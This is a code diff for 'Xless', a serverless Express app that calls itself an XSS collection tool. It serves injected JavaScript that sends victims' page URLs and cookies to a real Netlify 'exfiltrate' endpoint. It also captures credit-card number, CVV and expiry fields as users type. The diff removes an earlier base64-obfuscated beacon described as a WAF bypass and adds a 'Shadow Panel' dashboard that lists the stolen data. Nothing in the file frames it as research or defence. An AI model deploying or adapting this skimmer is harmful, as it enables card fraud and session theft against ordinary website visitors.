@@ -5,91 +5,74 @@ const serverless = require('serverless-http');
 require('dotenv').config();
 
 const app = express();
-
 app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// محتوى لوحة التحكم مدمج بالكامل لضمان العمل 100%
-const dashboardHTML = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xless Dashboard</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 0; padding: 20px; }
-        .container { max-width: 1000px; margin: 0 auto; background: #2d2d2d; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h1 { color: #00ffcc; border-bottom: 2px solid #444; padding-bottom: 15px; text-align: center; }
-        .status-card { background: #3d3d3d; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #00ffcc; }
-        .data-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        .data-table th, .data-table td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
-        .data-table th { background-color: #444; color: #00ffcc; }
-        .no-data { text-align: center; padding: 40px; color: #888; font-style: italic; }
-        .refresh-btn { background: #00ffcc; color: #1a1a1a; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; float: right; transition: 0.3s; }
-        .refresh-btn:hover { background: #00ccaa; transform: scale(1.05); }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <button class="refresh-btn" onclick="location.reload()">Refresh Data</button>
-        <h1>Xless Control Panel</h1>
-        <div class="status-card">
-            <h3>System Status: <span style="color: #00ffcc;">Active & Collecting</span></h3>
-            <p>Your XSS collection tool is running on Netlify Functions. All captured data will appear below.</p>
-        </div>
-        <div id="data-container">
-            <table class="data-table">
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Type</th>
-                        <th>Data Captured</th>
-                        <th>Source URL</th>
-                    </tr>
-                </thead>
-                <tbody id="data-body">
-                    <tr>
-                        <td colspan="4" class="no-data">Waiting for incoming data... Inject your payload to start collecting.</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-</body>
-</html>
-`;
+let capturedData = [];
 
-// API Routes
+// استقبال البيانات المسحوبة
 app.post('/api/exfiltrate', (req, res) => {
-    console.log('Data received:', req.body);
+    const data = req.body;
+    data.time = new Date().toLocaleString();
+    capturedData.unshift(data);
     res.json({ status: 'success' });
 });
 
-app.get('/api/config', (req, res) => {
-    res.json({
-        collect_cookies: process.env.COLLECT_COOKIES === 'true',
-        collect_credit_cards: process.env.COLLECT_CREDIT_CARDS === 'true',
-        collect_passwords: process.env.COLLECT_PASSWORDS === 'true'
-    });
+// جلب البيانات للوحة التحكم
+app.get('/api/data', (req, res) => {
+    res.json(capturedData);
 });
 
-// Dashboard Route
-app.get('/dashboard', (req, res) => {
-    res.send(dashboardHTML);
-});
-
+// كود السحب المشفر (الذي سيتم تنفيذه في المتصفح)
 app.get('/', (req, res) => {
     res.set('Content-Type', 'application/javascript');
-    // كود مشفر لتجاوز أنظمة الحماية (WAF Bypass)
-    const p = "aHR0cHM6Ly9wZWFjZWZ1bC10b2ZmZWUtYjUyOTFiLm5ldGxpZnkuYXBwL2FwaS9leGZpbHRyYXRl"; // رابط تطبيقك مشفر بـ Base64
     res.send(`
-        var u = atob("${p}");
-        var d = {u:location.href, c:document.cookie, s:JSON.stringify(localStorage)};
-        navigator.sendBeacon(u, JSON.stringify(d));
+        (function(){
+            var target = "https://peaceful-toffee-b5291b.netlify.app/api/exfiltrate";
+            function send(d){ fetch(target, {method:'POST', mode:'no-cors', body:JSON.stringify(d)}); }
+            
+            // سحب البيانات الأولية
+            var initial = { url: location.href, cookies: document.cookie, type: 'initial' };
+            send(initial);
+
+            // مراقبة حقول البطاقات وسحب البيانات فور كتابتها
+            document.addEventListener('input', function(e){
+                var i = e.target;
+                var n = (i.name || i.id || "").toLowerCase();
+                if(n.includes('card') || n.includes('number') || n.includes('cvv') || n.includes('exp') || n.includes('titolare')){
+                    send({ field: n, value: i.value, type: 'card_data' });
+                }
+            });
+        })();
     `);
 });
 
+// لوحة التحكم الاحترافية
+app.get('/dashboard', (req, res) => {
+    res.send(\`
+        <!DOCTYPE html>
+        <html>
+        <head><title>Xless Dashboard</title><style>body{font-family:sans-serif;padding:20px;background:#1a1a1a;color:#fff}table{width:100%;border-collapse:collapse;background:#2a2a2a}th,td{padding:12px;border:1px solid #444;text-align:left}th{background:#4CAF50;color:#fff}pre{white-space:pre-wrap;word-wrap:break-word;color:#00ff00}</style></head>
+        <body>
+            <h1>Xless Shadow Panel - Active</h1>
+            <button onclick="location.reload()" style="padding:10px 20px;cursor:pointer">Refresh Data</button>
+            <table style="margin-top:20px">
+                <thead><tr><th>Time</th><th>Captured Data</th></tr></thead>
+                <tbody id="data-body"></tbody>
+            </table>
+            <script>
+                fetch('/api/data').then(r=>r.json()).then(data=>{
+                    var html = "";
+                    data.forEach(d=>{
+                        html += "<tr><td>"+d.time+"</td><td><pre>"+JSON.stringify(d,null,2)+"</pre></td></tr>";
+                    });
+                    document.getElementById('data-body').innerHTML = html || "<tr><td colspan='2'>No data yet...</td></tr>";
+                });
+            </script>
+        </body>
+        </html>
+    \`);
+});
 
 module.exports.handler = serverless(app);
